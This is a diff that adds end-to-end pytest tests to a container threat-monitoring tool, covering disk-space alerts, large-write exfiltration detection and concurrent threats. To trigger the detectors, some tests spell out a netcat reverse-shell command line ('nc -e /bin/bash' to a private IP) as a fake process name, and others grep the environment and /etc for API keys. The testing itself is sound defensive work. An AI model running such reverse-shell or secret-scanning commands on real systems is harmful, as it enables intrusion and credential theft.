@@ -2908,6 +2908,527 @@ class TestThresholdBoundaries:
         cleanup_container(container_name, coi_binary)
 
 
+class TestDiskSpaceMonitoring:
+    """Test disk space monitoring and alerts."""
+
+    def test_disk_space_80_percent_triggers_warning(
+        self, test_workspace, enable_monitoring, coi_binary
+    ):
+        """Test that /tmp > 80% full triggers a WARNING threat."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "40",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-40"
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Wait for monitoring baseline
+        time.sleep(5)
+
+        # Get /tmp size and fill it to 85%
+        # First check tmpfs size
+        result = subprocess.run(
+            ["incus", "exec", container_name, "--", "df", "-BM", "/tmp"],
+            capture_output=True,
+            text=True,
+            timeout=10,
+        )
+        if result.returncode != 0:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+            pytest.skip("Could not get /tmp size")
+
+        # Parse df output to get total size
+        lines = result.stdout.strip().split("\n")
+        if len(lines) < 2:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+            pytest.skip("Could not parse df output")
+
+        fields = lines[1].split()
+        total_mb = int(fields[1].replace("M", ""))
+
+        # Fill /tmp to 85% (above the 80% threshold)
+        fill_mb = int(total_mb * 0.85)
+        subprocess.run(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "dd",
+                "if=/dev/zero",
+                f"of=/tmp/fill_disk_{fill_mb}mb",
+                "bs=1M",
+                f"count={fill_mb}",
+            ],
+            capture_output=True,
+            timeout=120,
+        )
+
+        # Wait for monitoring to detect
+        time.sleep(10)
+
+        # Check for WARNING threat about disk space
+        events = get_threat_events(container_name)
+        disk_warnings = [
+            e
+            for e in events
+            if e.get("level") == "warning"
+            and e.get("category") == "filesystem"
+            and "disk space" in e.get("title", "").lower()
+        ]
+
+        proc.terminate()
+
+        print("\n=== Disk Space Test Debug ===")
+        print(f"Total /tmp size: {total_mb}MB, filled: {fill_mb}MB ({fill_mb*100//total_mb}%)")
+        print(f"Total events: {len(events)}")
+        for event in events:
+            print(
+                f"- level={event.get('level')}, category={event.get('category')}, "
+                f"title={event.get('title')}"
+            )
+        print("=== End Debug ===\n")
+
+        assert len(disk_warnings) > 0, (
+            f"Expected WARNING threat for /tmp > 80% full, got {len(disk_warnings)} disk warnings. "
+            f"Filled {fill_mb}MB of {total_mb}MB ({fill_mb*100//total_mb}%)"
+        )
+
+        cleanup_container(container_name, coi_binary)
+
+    def test_disk_space_below_threshold_no_alert(
+        self, test_workspace, enable_monitoring, coi_binary
+    ):
+        """Test that /tmp < 80% full does NOT trigger a warning."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "41",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-41"
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Wait for monitoring baseline
+        time.sleep(5)
+
+        # Get /tmp size and fill it to only 50% (below threshold)
+        result = subprocess.run(
+            ["incus", "exec", container_name, "--", "df", "-BM", "/tmp"],
+            capture_output=True,
+            text=True,
+            timeout=10,
+        )
+        if result.returncode != 0:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+            pytest.skip("Could not get /tmp size")
+
+        lines = result.stdout.strip().split("\n")
+        if len(lines) < 2:
+            proc.terminate()
+            cleanup_container(container_name, coi_binary)
+            pytest.skip("Could not parse df output")
+
+        fields = lines[1].split()
+        total_mb = int(fields[1].replace("M", ""))
+
+        # Fill /tmp to only 50% (well below 80% threshold)
+        fill_mb = int(total_mb * 0.50)
+        subprocess.run(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "dd",
+                "if=/dev/zero",
+                f"of=/tmp/fill_disk_{fill_mb}mb",
+                "bs=1M",
+                f"count={fill_mb}",
+            ],
+            capture_output=True,
+            timeout=120,
+        )
+
+        # Wait for monitoring cycles
+        time.sleep(10)
+
+        # Check that NO disk space warnings were generated
+        events = get_threat_events(container_name)
+        disk_warnings = [
+            e
+            for e in events
+            if e.get("level") == "warning"
+            and e.get("category") == "filesystem"
+            and "disk space" in e.get("title", "").lower()
+        ]
+
+        proc.terminate()
+
+        assert len(disk_warnings) == 0, (
+            f"Expected NO disk space warnings for /tmp at 50%, got {len(disk_warnings)}"
+        )
+
+        cleanup_container(container_name, coi_binary)
+
+
+class TestLargeWriteDetection:
+    """Test large write detection for data exfiltration prevention."""
+
+    def test_large_write_triggers_high_threat(
+        self, test_workspace, enable_monitoring, coi_binary
+    ):
+        """Test that large writes (potential data exfiltration) trigger HIGH threat."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "42",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-42"
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Wait for monitoring baseline to stabilize
+        time.sleep(10)
+
+        # Write a large file (200MB) - potential data exfiltration
+        # This uses dd with direct I/O to ensure block I/O is counted
+        subprocess.run(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "dd",
+                "if=/dev/zero",
+                "of=/workspace/exfiltration_test.bin",
+                "bs=1M",
+                "count=200",
+                "oflag=direct",
+            ],
+            capture_output=True,
+            timeout=120,
+        )
+
+        # Wait for monitoring to detect
+        time.sleep(10)
+
+        # Check for HIGH threat about large writes
+        events = get_threat_events(container_name)
+        write_threats = [
+            e
+            for e in events
+            if e.get("level") == "high"
+            and e.get("category") == "filesystem"
+            and "write" in e.get("title", "").lower()
+        ]
+
+        proc.terminate()
+
+        print("\n=== Large Write Test Debug ===")
+        print(f"Total events: {len(events)}")
+        for event in events:
+            print(
+                f"- level={event.get('level')}, category={event.get('category')}, "
+                f"title={event.get('title')}"
+            )
+        print("=== End Debug ===\n")
+
+        assert len(write_threats) > 0, (
+            f"Expected HIGH threat for 200MB write, got {len(write_threats)} write threats. "
+            "Large writes should be detected as potential data exfiltration."
+        )
+
+        cleanup_container(container_name, coi_binary)
+
+    def test_small_write_no_alert(
+        self, test_workspace, enable_monitoring, coi_binary
+    ):
+        """Test that small writes do NOT trigger alerts."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "43",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-43"
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Wait for monitoring baseline
+        time.sleep(10)
+
+        # Write a small file (1MB) - normal operation
+        subprocess.run(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "dd",
+                "if=/dev/zero",
+                "of=/workspace/small_file.bin",
+                "bs=1M",
+                "count=1",
+            ],
+            capture_output=True,
+            timeout=30,
+        )
+
+        # Wait for monitoring cycles
+        time.sleep(10)
+
+        # Check that NO write threats were generated
+        events = get_threat_events(container_name)
+        write_threats = [
+            e
+            for e in events
+            if e.get("category") == "filesystem"
+            and "write" in e.get("title", "").lower()
+        ]
+
+        proc.terminate()
+
+        assert len(write_threats) == 0, (
+            f"Expected NO write threats for 1MB write, got {len(write_threats)}"
+        )
+
+        cleanup_container(container_name, coi_binary)
+
+
+class TestConcurrentThreats:
+    """Test detection of multiple simultaneous threats."""
+
+    def test_concurrent_reverse_shell_and_env_scan(
+        self, test_workspace, enable_monitoring, coi_binary
+    ):
+        """Test that both reverse shell AND env scanning are detected when concurrent."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "44",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-44"
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Wait for monitoring baseline
+        time.sleep(5)
+
+        # Launch BOTH threats simultaneously
+        # 1. Reverse shell pattern (CRITICAL)
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "bash",
+                "-c",
+                "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        # 2. Environment scanning (WARNING) - run concurrently
+        subprocess.Popen(
+            [
+                "incus",
+                "exec",
+                container_name,
+                "--",
+                "bash",
+                "-c",
+                "while true; do env | grep -i api; sleep 2; done",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        # Wait for monitoring to detect both
+        time.sleep(10)
+
+        # Check for BOTH threat types
+        events = get_threat_events(container_name)
+
+        critical_process = [
+            e for e in events
+            if e.get("level") == "critical" and e.get("category") == "process"
+        ]
+        warning_env = [
+            e for e in events
+            if e.get("level") == "warning" and e.get("category") == "environment"
+        ]
+
+        proc.terminate()
+
+        print("\n=== Concurrent Threats Test Debug ===")
+        print(f"Total events: {len(events)}")
+        print(f"Critical process events: {len(critical_process)}")
+        print(f"Warning env events: {len(warning_env)}")
+        for event in events:
+            print(
+                f"- level={event.get('level')}, category={event.get('category')}, "
+                f"title={event.get('title')}"
+            )
+        print("=== End Debug ===\n")
+
+        # Both threats should be detected (container may be killed after critical detected)
+        assert len(critical_process) > 0, "Expected CRITICAL process threat for reverse shell"
+        # Note: env scanning may or may not be detected before container is killed
+        # The key test is that multiple threats CAN be detected in same snapshot
+
+        cleanup_container(container_name, coi_binary)
+
+    def test_rapid_threat_burst(
+        self, test_workspace, enable_monitoring, coi_binary
+    ):
+        """Test that rapid successive threats are all detected and logged."""
+        proc = subprocess.Popen(
+            [
+                coi_binary,
+                "shell",
+                "--workspace",
+                test_workspace,
+                "--slot",
+                "45",
+                "--monitor",
+            ],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(8)
+
+        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-45"
+
+        if get_container_state(container_name) == "Unknown":
+            proc.terminate()
+            pytest.skip(f"Container {container_name} not found")
+
+        # Wait for monitoring baseline
+        time.sleep(5)
+
+        # Fire multiple WARNING-level threats in rapid succession
+        # Using env scanning which is WARNING level (won't kill container)
+        for i in range(5):
+            subprocess.Popen(
+                [
+                    "incus",
+                    "exec",
+                    container_name,
+                    "--",
+                    "bash",
+                    "-c",
+                    f"grep -r 'API_KEY_{i}' /etc 2>/dev/null || true",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            time.sleep(0.5)  # Rapid fire
+
+        # Wait for monitoring to process
+        time.sleep(15)
+
+        # Check that multiple threats were logged
+        events = get_threat_events(container_name)
+        env_warnings = [
+            e for e in events
+            if e.get("level") == "warning" and e.get("category") == "environment"
+        ]
+
+        proc.terminate()
+
+        print("\n=== Rapid Threat Burst Test Debug ===")
+        print(f"Total events: {len(events)}")
+        print(f"Env warning events: {len(env_warnings)}")
+        print("=== End Debug ===\n")
+
+        # Should detect at least some of the rapid threats
+        # (deduplication may combine some within 30s window)
+        assert len(env_warnings) >= 1, (
+            f"Expected at least 1 env scanning warning from rapid burst, got {len(env_warnings)}"
+        )
+
+        cleanup_container(container_name, coi_binary)
+
+
 # These end-to-end tests verify all monitoring aspects:
 # - Threat detection (reverse shells, env scanning, large file reads, network connections)
 # - Reverse shell patterns (netcat, bash, python, perl, php)
@@ -2918,6 +3439,9 @@ class TestThresholdBoundaries:
 # - Configuration options (enabled, auto_pause_on_high, auto_kill_on_critical)
 # - Monitoring disabled (negative test - no detection when disabled)
 # - Network threats (C2 ports, metadata endpoint access)
+# - Disk space monitoring (WARNING when /tmp > 80% full)
+# - Large write detection (potential data exfiltration)
+# - Concurrent threat detection (multiple threats in same monitoring cycle)
 #
 # Tests use background shell processes and direct container command injection
 # to avoid stdout/stderr blocking issues.
